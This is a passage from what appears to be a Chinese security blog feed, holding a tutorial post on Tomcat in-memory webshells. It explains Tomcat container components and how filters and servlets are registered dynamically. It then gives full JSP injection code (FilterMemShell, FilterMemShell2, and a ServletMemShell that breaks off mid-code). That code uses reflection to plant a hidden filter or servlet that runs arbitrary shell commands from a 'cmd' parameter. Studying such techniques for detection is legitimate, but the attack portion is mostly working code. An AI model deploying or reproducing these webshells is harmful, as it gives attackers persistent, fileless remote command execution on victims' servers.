      <category>漏洞分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat内存webshell</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/Tomcat%E5%86%85%E5%AD%98webshell/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/Tomcat%E5%86%85%E5%AD%98webshell/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat内存webshell"><a href="#Tomcat内存webshell" class="headerlink" title="Tomcat内存webshell"></a>Tomcat内存webshell</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>什么是tomcat 内存webshell?</p><div class="code-wrapper"><pre><code class="hljs">内存webshell是利用tomcat中间件容器特性，在tomcat运行过程中动态注册恶意组件，将恶意代码驻留在内存中，直到tomcat中间件重启恶意代码才会消失的。</code></pre></div><p>java内存webshell注入场景</p><div class="code-wrapper"><pre><code class="hljs">反序列化漏洞能够命令执行写入jsp文件</code></pre></div><h2 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h2><div class="code-wrapper"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.Container是tomcat的一个接口，其有<span class="hljs-number">4</span>个子接口和<span class="hljs-number">1</span>个实现类<span class="hljs-number">4</span>个子接口：org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.Host</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.Engine</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.Context</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.Wrapper</span><span class="hljs-number">1</span>个实现类：org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.ContainerBase</span><span class="hljs-number">4</span>个子接口均存在一个标准实现类：org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.StandardHost</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.StandardWrapper</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.StandardContext</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span><span class="hljs-selector-class">.core</span>.StandardEngine</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230822092330665.png"></p><h2 id="容器组件"><a href="#容器组件" class="headerlink" title="容器组件"></a>容器组件</h2><h3 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h3><h3 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h3><p>代表一个主机</p><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><p>代表一个web应用。如webapps目录下的一个web应用。</p><h3 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h3><p>代表一个servlet</p><h1 id="内存马的实现"><a href="#内存马的实现" class="headerlink" title="内存马的实现"></a>内存马的实现</h1><p>在明白注册内存马原理前，需要了解tomcat如何注册filter、servlet、listener组件。</p><p>以注册filter组件为例：</p><p>web.xml</p><div class="code-wrapper"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">filter</span>&gt;&lt;<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;MyFilter&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;&lt;<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">class</span>&gt;MyFilter&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">class</span>&gt;&lt;/<span class="hljs-keyword">filter</span>&gt;&lt;<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">mapping</span>&gt;&lt;<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;MyFilter&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;&lt;url-pattern&gt;/myservlet&lt;/url-pattern&gt;&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">mapping</span>&gt;</code></pre></div><p>MyFilter.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;        System.out.println(<span class="hljs-string">&quot;[INFO] MyFilter,收到一次filter过滤.&quot;</span>);        filterChain.doFilter(servletRequest, servletResponse);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;    &#125;&#125;</code></pre></div><h2 id="如何获取StandardContext"><a href="#如何获取StandardContext" class="headerlink" title="如何获取StandardContext"></a>如何获取StandardContext</h2><p><strong>通过当前 request 对象获取 ServletContext</strong></p><p><strong>如何获取运行状态中上下文中的 request 对象</strong></p><div class="code-wrapper"><pre><code class="hljs haxe">org.apache.catalina.core.ApplicationFilterChain<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;<span class="hljs-keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;lastServicedRequest.<span class="hljs-keyword">set</span>(request);lastServicedResponse.<span class="hljs-keyword">set</span>(response);&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230822095104338.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230822095044116.png"></p><p><strong>通过 Thread.currentThread().getContextClassLoader() 获取上下文中的 StandardContext</strong></p><div class="code-wrapper"><pre><code class="hljs abnf">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase <span class="hljs-operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span>StandardContext standardCtx <span class="hljs-operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext()<span class="hljs-comment">;</span></code></pre></div><p>方法的局限性：</p><div class="code-wrapper"><pre><code class="hljs">不适用于tomcat7</code></pre></div><p><strong>在 spring 项目中通过 spring 容器来获取 servletContext 对象</strong></p><div class="code-wrapper"><pre><code class="hljs abnf">ServletContext servletContext <span class="hljs-operator">=</span> ContextLoader.getCurrentWebApplicationContext().getServletContext()<span class="hljs-comment">;</span></code></pre></div><p>方法的局限性：</p><div class="code-wrapper"><pre><code class="hljs stylus">这种情况下有一定的限制，就是 servletContext 值的初始化的 servletContextListener 一定要在 org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.context</span><span class="hljs-selector-class">.ContextLoaderListener</span> 之前加载。需要目标环境上存在spring依赖</code></pre></div><h2 id="如何动态注册组件"><a href="#如何动态注册组件" class="headerlink" title="如何动态注册组件"></a>如何动态注册组件</h2><p>org.apache.catalina.core.ApplicationContextFacade类中实现了动态注册servlet、filter、listen的方法</p><div class="code-wrapper"><pre><code class="hljs delphi">&lt;T extends Filter&gt;createFilter(Java.lang.<span class="hljs-keyword">Class</span>&lt;T&gt; clazz)javax.servlet.FilterRegistration.<span class="hljs-keyword">Dynamic</span> addFilter(<span class="hljs-keyword">String</span> var1, <span class="hljs-keyword">String</span> var2);javax.servlet.FilterRegistration.<span class="hljs-keyword">Dynamic</span> addFilter(<span class="hljs-keyword">String</span> var1, Filter var2);javax.servlet.FilterRegistration.<span class="hljs-keyword">Dynamic</span> addFilter(<span class="hljs-keyword">String</span> var1, <span class="hljs-keyword">Class</span>&lt;? extends Filter&gt; var2);&lt;T extends Servlet&gt;createServlet(java.lang.<span class="hljs-keyword">Class</span>&lt;T&gt; clazz)<span class="hljs-keyword">Dynamic</span> addServlet(<span class="hljs-keyword">String</span> var1, <span class="hljs-keyword">String</span> var2);<span class="hljs-keyword">Dynamic</span> addServlet(<span class="hljs-keyword">String</span> var1, Servlet var2);<span class="hljs-keyword">Dynamic</span> addServlet(<span class="hljs-keyword">String</span> var1, <span class="hljs-keyword">Class</span>&lt;? extends Servlet&gt; var2);</code></pre></div><h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>流程</p><div class="code-wrapper"><pre><code class="hljs livecodeserver">创建恶意<span class="hljs-built_in">filter</span>用filterDef对<span class="hljs-built_in">filter</span>进行封装将filterDef添加到filterDefs跟filterConfigs中创建一个新的filterMap将<span class="hljs-built_in">URL</span>跟<span class="hljs-built_in">filter</span>进行绑定，并添加到filterMaps中将<span class="hljs-built_in">filter</span>给移动到FilterChain的第一位</code></pre></div><h3 id="filterDef"><a href="#filterDef" class="headerlink" title="filterDef"></a>filterDef</h3><p>filterDef对象存储了filter的名称、filter对应的类等信息</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230822113449909.png"></p><h3 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h3><p>filterMaps对象在org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法中创建，filterMaps对象存储着</p><div class="code-wrapper"><pre><code class="hljs abnf">FilterMap[] filterMaps <span class="hljs-operator">=</span> context.findFilterMaps()<span class="hljs-comment">;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230822114040554.png"></p><h3 id="filterConfig"><a href="#filterConfig" class="headerlink" title="filterConfig"></a>filterConfig</h3><p>filterConfig对象在org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法中创建</p><div class="code-wrapper"><pre><code class="hljs abnf">ApplicationFilterConfig filterConfig<span class="hljs-comment">;</span></code></pre></div><p>filterConfig对象中存储着StandardContext对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230822120042723.png"></p><p>context对象中又存储着filterConfigs、filterDefs、filterMaps对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230822120237634.png"></p><p><strong>相关源代码</strong></p><div class="code-wrapper"><pre><code class="hljs java">FilterMap[] filterMaps = context.findFilterMaps();<span class="hljs-keyword">if</span> (filterMaps != <span class="hljs-literal">null</span> &amp;&amp; filterMaps.length != <span class="hljs-number">0</span>) &#123;    <span class="hljs-type">DispatcherType</span> <span class="hljs-variable">dispatcher</span> <span class="hljs-operator">=</span> (DispatcherType)request.getAttribute(<span class="hljs-string">&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;</span>);    <span class="hljs-type">String</span> <span class="hljs-variable">requestPath</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;    <span class="hljs-type">Object</span> <span class="hljs-variable">attribute</span> <span class="hljs-operator">=</span> request.getAttribute(<span class="hljs-string">&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;</span>);    <span class="hljs-keyword">if</span> (attribute != <span class="hljs-literal">null</span>) &#123;        requestPath = attribute.toString();    &#125;    <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();    <span class="hljs-type">int</span> i;    ApplicationFilterConfig filterConfig;    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; filterMaps.length; ++i) &#123;        <span class="hljs-keyword">if</span> (matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; matchFiltersURL(filterMaps[i], requestPath)) &#123;            filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());            <span class="hljs-keyword">if</span> (filterConfig != <span class="hljs-literal">null</span>) &#123;                filterChain.addFilter(filterConfig);            &#125;        &#125;    &#125;    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; filterMaps.length; ++i) &#123;        <span class="hljs-keyword">if</span> (matchDispatcher(filterMaps[i], dispatcher) &amp;&amp; matchFiltersServlet(filterMaps[i], servletName)) &#123;            filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());            <span class="hljs-keyword">if</span> (filterConfig != <span class="hljs-literal">null</span>) &#123;                filterChain.addFilter(filterConfig);            &#125;        &#125;    &#125;</code></pre></div><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>流程</p><div class="code-wrapper"><pre><code class="hljs pgsql">创建恶意Servlet用<span class="hljs-keyword">Wrapper</span>对其进行封装添加封装后的恶意<span class="hljs-keyword">Wrapper</span>到StandardContext的children当中添加ServletMapping将访问的URL和Servlet进行绑定</code></pre></div><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>&#x2F;&#x2F;TODO</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="FilterMemShell"><a href="#FilterMemShell" class="headerlink" title="FilterMemShell"></a>FilterMemShell</h2><div class="code-wrapper"><pre><code class="hljs pgsql">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; <span class="hljs-keyword">language</span>=&quot;java&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.util.Map&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.io.IOException&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.util.Scanner&quot; %&gt;&lt;%    final String <span class="hljs-type">name</span> = &quot;5wmming&quot;;    // 获取上下文    ServletContext servletContext = request.getSession().getServletContext();    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);    appctx.setAccessible(<span class="hljs-keyword">true</span>);    ApplicationContext applicationContext = (ApplicationContext) appctx.<span class="hljs-keyword">get</span>(servletContext);    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);    stdctx.setAccessible(<span class="hljs-keyword">true</span>);    StandardContext standardContext = (StandardContext) stdctx.<span class="hljs-keyword">get</span>(applicationContext);    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);    Configs.setAccessible(<span class="hljs-keyword">true</span>);    Map filterConfigs = (Map) Configs.<span class="hljs-keyword">get</span>(standardContext);    <span class="hljs-keyword">if</span> (filterConfigs.<span class="hljs-keyword">get</span>(<span class="hljs-type">name</span>) == <span class="hljs-keyword">null</span>)&#123;        <span class="hljs-keyword">Filter</span> <span class="hljs-keyword">filter</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Filter</span>() &#123;            @Override            <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> init(FilterConfig filterConfig) throws ServletException &#123;            &#125;            @Override            <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                HttpServletRequest req = (HttpServletRequest) servletRequest;                <span class="hljs-keyword">if</span> (req.getParameter(&quot;cmd&quot;) != <span class="hljs-keyword">null</span>) &#123;                    <span class="hljs-type">boolean</span> isLinux = <span class="hljs-keyword">true</span>;                    String osTyp = <span class="hljs-keyword">System</span>.getProperty(&quot;os.name&quot;);                    <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;                        isLinux = <span class="hljs-keyword">false</span>;                    &#125;                    String[] cmds = isLinux ? <span class="hljs-built_in">new</span> String[] &#123;&quot;sh&quot;, &quot;-c&quot;, req.getParameter(&quot;cmd&quot;)&#125; : <span class="hljs-built_in">new</span> String[] &#123;&quot;cmd.exe&quot;, &quot;/c&quot;, req.getParameter(&quot;cmd&quot;)&#125;;                    InputStream <span class="hljs-keyword">in</span> = Runtime.getRuntime().exec(cmds).getInputStream();                    Scanner s = <span class="hljs-built_in">new</span> Scanner( <span class="hljs-keyword">in</span> ).useDelimiter(&quot;\\\\\\\\a&quot;);                    String output = s.hasNext() ? s.next() : &quot;&quot;;                    servletResponse.getWriter().<span class="hljs-keyword">write</span>(output);                    servletResponse.getWriter().flush();                    <span class="hljs-keyword">return</span>;                &#125;                filterChain.doFilter(servletRequest, servletResponse);            &#125;            @Override            <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> destroy() &#123;            &#125;        &#125;;        FilterDef filterDef = <span class="hljs-built_in">new</span> FilterDef();        filterDef.setFilter(<span class="hljs-keyword">filter</span>);        filterDef.setFilterName(<span class="hljs-type">name</span>);        filterDef.setFilterClass(<span class="hljs-keyword">filter</span>.getClass().getName());        standardContext.addFilterDef(filterDef);        FilterMap filterMap = <span class="hljs-built_in">new</span> FilterMap();        filterMap.addURLPattern(&quot;/*&quot;);        filterMap.setFilterName(<span class="hljs-type">name</span>);        filterMap.setDispatcher(DispatcherType.REQUEST.name());        standardContext.addFilterMapBefore(filterMap);        Constructor constructor = ApplicationFilterConfig.<span class="hljs-keyword">class</span>.getDeclaredConstructor(Context.<span class="hljs-keyword">class</span>,FilterDef.<span class="hljs-keyword">class</span>);        constructor.setAccessible(<span class="hljs-keyword">true</span>);        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);        filterConfigs.put(<span class="hljs-type">name</span>, filterConfig);        <span class="hljs-keyword">out</span>.print(&quot;Inject Success !&quot;);    &#125;%&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;<span class="hljs-keyword">filter</span>&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Hello <span class="hljs-keyword">Filter</span>&lt;/body&gt;&lt;/html&gt;</code></pre></div><h2 id="FilterMemShell2"><a href="#FilterMemShell2" class="headerlink" title="FilterMemShell2"></a>FilterMemShell2</h2><div class="code-wrapper"><pre><code class="hljs pgsql">&lt;%@ page <span class="hljs-keyword">language</span>=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;         pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.io.IOException&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.DispatcherType&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.Filter&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.FilterChain&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.FilterConfig&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.FilterRegistration&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.ServletContext&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.ServletException&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.ServletRequest&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.ServletResponse&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.annotation.WebServlet&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.http.HttpServlet&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.http.HttpServletRequest&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;javax.servlet.http.HttpServletResponse&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.core.ApplicationContext&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.tomcat.util.descriptor.web.*&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.Context&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.lang.reflect.*&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.util.EnumSet&quot;%&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.util.Map&quot;%&gt;&lt;!DOCTYPE html <span class="hljs-built_in">PUBLIC</span> &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;&lt;http://www.w3.org/TR/html4/loose.dtd&gt;&quot;&gt;&lt;html&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;    &lt;title&gt;<span class="hljs-keyword">Insert</span> title here&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    final String <span class="hljs-type">name</span> = &quot;n1ntyfilter&quot;;    ServletContext ctx = request.getSession().getServletContext();    Field f = ctx.getClass().getDeclaredField(&quot;context&quot;);    f.setAccessible(<span class="hljs-keyword">true</span>);    ApplicationContext appCtx = (ApplicationContext)f.<span class="hljs-keyword">get</span>(ctx);    f = appCtx.getClass().getDeclaredField(&quot;context&quot;);    f.setAccessible(<span class="hljs-keyword">true</span>);    StandardContext standardCtx = (StandardContext)f.<span class="hljs-keyword">get</span>(appCtx);    f = standardCtx.getClass().getDeclaredField(&quot;filterConfigs&quot;);    f.setAccessible(<span class="hljs-keyword">true</span>);    Map filterConfigs = (Map)f.<span class="hljs-keyword">get</span>(standardCtx);    <span class="hljs-keyword">if</span> (filterConfigs.<span class="hljs-keyword">get</span>(<span class="hljs-type">name</span>) == <span class="hljs-keyword">null</span>) &#123;        <span class="hljs-keyword">out</span>.println(&quot;inject &quot;+ <span class="hljs-type">name</span>);        <span class="hljs-keyword">Filter</span> <span class="hljs-keyword">filter</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Filter</span>() &#123;            @Override            <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> init(FilterConfig arg0) throws ServletException &#123;                // TODO Auto-<span class="hljs-keyword">generated</span> <span class="hljs-keyword">method</span> stub            &#125;            @Override            <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)                    throws IOException, ServletException &#123;                // TODO Auto-<span class="hljs-keyword">generated</span> <span class="hljs-keyword">method</span> stub                HttpServletRequest req = (HttpServletRequest)arg0;                <span class="hljs-keyword">if</span> (req.getParameter(&quot;cmd&quot;) != <span class="hljs-keyword">null</span>) &#123;                    byte[] data = <span class="hljs-built_in">new</span> byte[<span class="hljs-number">1024</span>];                    Process p = <span class="hljs-built_in">new</span> ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;, req.getParameter(&quot;cmd&quot;)).<span class="hljs-keyword">start</span>();                    <span class="hljs-type">int</span> len = p.getInputStream().<span class="hljs-keyword">read</span>(data);                    p.destroy();                    arg1.getWriter().<span class="hljs-keyword">write</span>(<span class="hljs-built_in">new</span> String(data, <span class="hljs-number">0</span>, len));                    <span class="hljs-keyword">return</span>;                &#125;                arg2.doFilter(arg0, arg1);            &#125;            @Override            <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> destroy() &#123;                // TODO Auto-<span class="hljs-keyword">generated</span> <span class="hljs-keyword">method</span> stub            &#125;        &#125;;        FilterDef filterDef = <span class="hljs-built_in">new</span> FilterDef();        filterDef.setFilterName(<span class="hljs-type">name</span>);        filterDef.setFilterClass(<span class="hljs-keyword">filter</span>.getClass().getName());        filterDef.setFilter(<span class="hljs-keyword">filter</span>);        standardCtx.addFilterDef(filterDef);        FilterMap m = <span class="hljs-built_in">new</span> FilterMap();        m.setFilterName(filterDef.getFilterName());        m.setDispatcher(DispatcherType.REQUEST.name());        m.addURLPattern(&quot;/*&quot;);        standardCtx.addFilterMapBefore(m);        Constructor constructor = ApplicationFilterConfig.<span class="hljs-keyword">class</span>.getDeclaredConstructor(Context.<span class="hljs-keyword">class</span>, FilterDef.<span class="hljs-keyword">class</span>);        constructor.setAccessible(<span class="hljs-keyword">true</span>);        FilterConfig filterConfig = (FilterConfig)constructor.newInstance(standardCtx, filterDef);        filterConfigs.put(<span class="hljs-type">name</span>, filterConfig);        <span class="hljs-keyword">out</span>.println(&quot;injected&quot;);    &#125;%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><h2 id="ServletMemShell"><a href="#ServletMemShell" class="headerlink" title="ServletMemShell"></a>ServletMemShell</h2><p><a href="http://localhost:8080/testMemShell/servlet.jsp">http://localhost:8080/testMemShell/servlet.jsp</a></p><p><a href="http://localhost:8080/testMemShell/shell?cmd=calc">http://localhost:8080/testMemShell/shell?cmd=calc</a></p><div class="code-wrapper"><pre><code class="hljs pgsql">&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.io.IOException&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=&quot;java.io.PrintWriter&quot; %&gt;&lt;%  // 创建恶意Servlet  Servlet servlet = <span class="hljs-built_in">new</span> Servlet() &#123;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> init(ServletConfig servletConfig) throws ServletException &#123;    &#125;    @Override    <span class="hljs-built_in">public</span> ServletConfig getServletConfig() &#123;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    &#125;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;      String cmd = servletRequest.getParameter(&quot;cmd&quot;);      <span class="hljs-type">boolean</span> isLinux = <span class="hljs-keyword">true</span>;      String osTyp = <span class="hljs-keyword">System</span>.getProperty(&quot;os.name&quot;);      <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;        isLinux = <span class="hljs-keyword">false</span>;      &#125;      String[] cmds = isLinux ? <span class="hljs-built_in">new</span> String[]&#123;&quot;sh&quot;, &quot;-c&quot;, cmd&#125; : <span class="hljs-built_in">new</span> String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;;      InputStream <span class="hljs-keyword">in</span> = Runtime.getRuntime().exec(cmds).getInputStream();      Scanner s = <span class="hljs-built_in">new</span> Scanner(<span class="hljs-keyword">in</span>).useDelimiter(&quot;\\\\\\\\a&quot;);      String output = s.hasNext() ? s.next() : &quot;&quot;;      PrintWriter <span class="hljs-keyword">out</span> = servletResponse.getWriter();      <span class="hljs-keyword">out</span>.println(output);      <span class="hljs-keyword">out</span>.flush();      <span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();    &#125;    @Override    <span class="hljs-built_in">public</span> String getServletInfo() &#123;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    &#125;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> destroy() &#123;    &#125;  &#125;;%&gt;&lt;%  // 获取StandardContext  org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();  // 用<span class="hljs-keyword">Wrapper</span>对其进行封装  org.apache.catalina.<span class="hljs-keyword">Wrapper</span> newWrapper = standardCtx.createWrapper();  newWrapper.setName(&quot;jweny&quot;);  newWrapper.setLoadOnStartup(<span class="hljs-number">1</span>);  newWrapper.setServlet(servlet);  newWrapper.setServletClass(servlet.getClass().getName());  // 添加封装后的恶意<span 